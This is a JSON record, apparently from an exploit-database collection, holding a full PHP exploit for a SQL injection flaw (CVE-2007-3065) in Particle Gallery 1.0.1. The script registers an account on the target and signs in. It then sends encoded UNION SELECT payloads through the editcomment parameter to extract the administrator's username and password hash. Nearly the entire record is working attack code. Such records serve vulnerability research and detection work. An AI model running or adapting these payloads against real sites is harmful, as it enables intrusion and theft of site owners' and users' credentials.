{
  "id": "4019",
  "title": "Particle Gallery 1.0.1 - SQL Injection",
  "cve": "CVE-2007-3065",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?php\r\n\r\n/*\r\n\r\nExplanation:\r\n\r\nFunction dbSecure(functions.php):\r\n\r\nfunction dbSecure($code){\r\n\t\r\n\tif (get_magic_quotes_gpc()) {\r\n\t   $code = stripslashes($code);\r\n\t}\r\n\t\r\n\tif (function_exists(\"mysql_real_escape_string\")){\r\n\t\t$code = mysql_real_escape_string($code);\r\n\t} elseif (function_exists(\"mysql_escape_string\")){\r\n\t\t$code = mysql_escape_string($code);\r\n\t} else {\r\n\t\t$code = addslashes($code);\r\n\t}\r\n\t\r\n\treturn $code;\r\n}\r\n\r\n\r\nExcellent function for SQL input validation, yet we don't even need this function here as we don't \r\nneed to add any quotes...haha!\r\n\r\n\r\nVulnerable Code(viewimage.php):\r\n\r\n$t->set_var(\"COMMENT_ID\", \"\");\r\nif ($_GET[\"editcomment\"] <> \"\"){\r\n\t$sql = \"SELECT * FROM \" . $dbprefix . \"comments WHERE commentid = \" . dbSecure($_GET[\"editcomment\"]);\r\n\t$cme = $db->execute($sql);\r\n\tif ($usr->Access > 1 || ($_SESSION[\"userid\"] == $cme->fields[\"userid\"])){\r\n\t\t// allow user to edit the comment\r\n\t\t$t->set_var(\"COMMENTS_TYPE\", \"Edit\");\r\n\t\t$t->set_var(\"COMMENT_ID\", $cme->fields[\"commentid\"]);\r\n\t\t$t->set_var(\"COMMENTS_FORM\", $core . \"&amp;commentspage=\" . $page);\r\n\t\tif ($_POST[\"comments\"] <> \"\"){\r\n\t\t\t$t->set_var(\"COMMENTS_TEXT\", un($_POST[\"comments\"]));\r\n\t\t} else {\r\n\t\t\t$t->set_var(\"COMMENTS_TEXT\", $cme->fields[\"comments\"]);\r\n\t\t}\r\n\t}\r\n\r\n\r\n...classic!\r\n\r\n*/\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nif ($argc<3) {\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"              Particle Gallery <= 1.0.1 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_pg.php [HOST] [PATH]\\r\\n\\r\\n\";\r\nprint \"[HOST] \t  = Target server's hostname or ip address\\r\\n\";\r\nprint \"[PATH] \t  = Path where Particle Gallery is located\\r\\n\";\r\nprint \"e.g. w4ck1ng_pg.php 0 victim.com /pg/\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\ndie;\r\n}\r\n\r\nfunction footer(){\r\n\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\r\n}\r\n\r\n//Props to rgod for the following functions\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\n\r\n$host = $argv[1];\r\n$path = $argv[2];\r\n$port=80;\r\n$proxy=\"\";\r\n\r\nfor ($i=4; $i<=$argc-1; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif (($temp<>\"-p\") and ($temp<>\"-P\"))\r\n{\r\n$cmd.=\" \".$argv[$i];\r\n}\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\n}\r\n\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\n\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"              Particle Gallery <= 1.0.1 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\r\n    echo \"\\r\\n[+] Checking if user exists...\";\r\n\r\n    $data=\"username=w4ck1ng\";\r\n    $data.=\"&password=w4ck1ng\";\r\n    $data.=\"&from=\";\r\n    $packet =\"POST \" . $p . \"auth.php?do=signin HTTP/1.1\\r\\n\";\r\n    $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    $packet.=$data;\r\n\r\n    sendpacketii($packet);\r\n\r\n    if (strstr($html,\"User Control Panel\")){echo \"...Yep!\\r\\n\";}\r\n    else{echo \"...Nope!\"; \r\n \r\n    echo \"\\r\\n[+] Registering...\";\r\n\r\n    $data=\"rusername=w4ck1ng\";\r\n    $data.=\"&password=w4ck1ng\";\r\n    $data.=\"&password2=w4ck1ng\";\r\n    $data.=\"&email=w4ck1ng%40www.com\";\r\n    $data.=\"&do=register\";\r\n    $packet =\"POST \" . $p . \"auth.php?page=register HTTP/1.1\\r\\n\";\r\n    $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    $packet.=$data;\r\n\r\n    sendpacketii($packet);\r\n\r\n    $temp=explode(\"Set-Cookie: \",$html);\r\n    $temp2=explode(\" \",$temp[1]);\r\n    $cookie=$temp2[0];\r\n\r\n    if (strstr($html,\"Location: index.php?act=newbie\")){echo \"...Successful!\\r\\n\";}\r\n    if (strstr($html,\"Registrations are not currently being accepted.\")){echo \"...Registration Disabled!\\r\\n\"; footer(); exit;}\r\n    else{} }\r\n\r\n    echo \"[+] Signing In...\";\r\n\r\n    $data=\"username=w4ck1ng\";\r\n    $data.=\"&password=w4ck1ng\";\r\n    $data.=\"&from=\";\r\n    $packet =\"POST \" . $p . \"auth.php?do=signin HTTP/1.1\\r\\n\";\r\n    $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    $packet.=$data;\r\n\r\n    sendpacketii($packet);\r\n\r\n    $temp=explode(\"Set-Cookie: \",$html);\r\n    $temp2=explode(\" \",$temp[1]);\r\n    $cookie=$temp2[0];\r\n\r\n    if (strstr($html,\"Welcome to your account control panel\")){echo \"...Successful!\";}\r\n    else{die(\"...Failed!\\r\\n\"); footer(); exit;} \r\n\r\n    $packet =\"GET \" . $p . \" HTTP/1.1\\r\\n\";\r\n    $packet.=\"Host: \" . $host . \"\\r\\n\";\r\n    $packet.=\"Cookie: \" . $cookie . \"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    sendpacketii($packet);\r\n\r\n        if (strstr($html,\"<td style=\\\"text-align: right;\\\"><a href=\\\"viewimage.php?imageid=\")){\r\n\r\n\t    \t$temp=explode(\"<td style=\\\"text-align: right;\\\"><a href=\\\"viewimage.php?imageid=\",$html);\r\n    \t\t$temp2=explode(\"\\\">\",$temp[1]);\r\n\t\t$imageid=$temp2[0];\r\n\r\n\t\techo \"\\r\\n[+] Image ID Retrieved...\" . $imageid . \"!\\n\";}\r\n\r\n\telse{echo \"\\r\\n[-] Cannot retrieve a valid image ID...\\n\"; footer(); exit;}\r\n\r\n\r\n    $data=\"comments=Your+about+to+get+owned%21\";\r\n    $data.=\"&do=comment\";\r\n    $data.=\"&commentid=\";\r\n    $packet =\"POST \" . $p . \"viewimage.php?imageid=\" . $imageid . \" HTTP/1.1\\r\\n\";\r\n    $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n    $packet.=\"Host: \".$host.\"\\r\\n\";\r\n    $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n    $packet.=\"Cookie: \" . $cookie . \"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    $packet.=$data;\r\n\r\n    sendpacketii($packet);\r\n\r\n    if (strstr($html,\"Comments posted successfully!\")){echo \"[+] Posting comment...Done!\\n\";}\r\n    else{echo \"[-] Posting comment...Failed!\\n\"; footer(); exit;} \r\n\r\n    $sqlArray = array(\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,54),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,55),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,56),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,57),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,48),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,49),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,50),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,51),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\"\r\n);\r\n\r\nfor ($i=0; $i<=count($sqlArray); $i++){\r\n\r\n    $packet =\"GET \" . $p . $sqlArray[$i] . \" HTTP/1.1\\r\\n\";\r\n    $packet.=\"Host: \" . $host . \"\\r\\n\";\r\n    $packet.=\"Cookie: \" . $cookie . \"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    sendpacketii($packet);\r\n\r\n    if (strstr($html,\"name=\\\"comments\\\">Username=\")){\r\n\t    \t$temp3=explode(\"id=\\\"comments\\\" name=\\\"comments\\\">Username=\",$html);\r\n    \t\t$temp4=explode(\":\",$temp3[1]);\r\n\t\t$ret_user=$temp4[0];\r\n\r\n\t\techo \"\\r\\n[+] Admin User: \" . $ret_user;}\r\n\r\n    \r\n\telseif (strstr($html,\"404\")){\r\n\t\t\techo \"\\r\\n[-] Image ID is not valid, please try another!\"; footer(); exit;}\r\n    else{} \r\n}\r\n\r\n    $sqlArray = array(\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,54),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,55),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,56),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,57),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,48),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,49),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,50),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\",\r\n\"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,51),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*\"\r\n);\r\n\r\nfor ($i=0; $i<=count($sqlArray); $i++){\r\n\r\n    $packet =\"GET \" . $p . $sqlArray[$i] . \" HTTP/1.1\\r\\n\";\r\n    $packet.=\"Host: \" . $host . \"\\r\\n\";\r\n    $packet.=\"Cookie: \" . $cookie . \"\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    sendpacketii($packet);\r\n\r\n    if (strstr($html,\":Hash=\")){\r\n\t    \t$temp3=explode(\"Hash=\",$html);\r\n    \t\t$temp4=explode(\"&lt;/textarea&gt;\",$temp3[1]);\r\n\t\t$ret_hash=$temp4[0];\r\n\r\n\t\techo \"\\r\\n[+] Admin User: \" . $ret_hash . \"\\n\";}\r\n    else{} \r\n}\r\n\r\nfooter();\r\n\r\n?>\r\n\r\n# milw0rm.com [2007-06-01]",
  "url": "https://www.exploit-db.com/exploits/4019"
}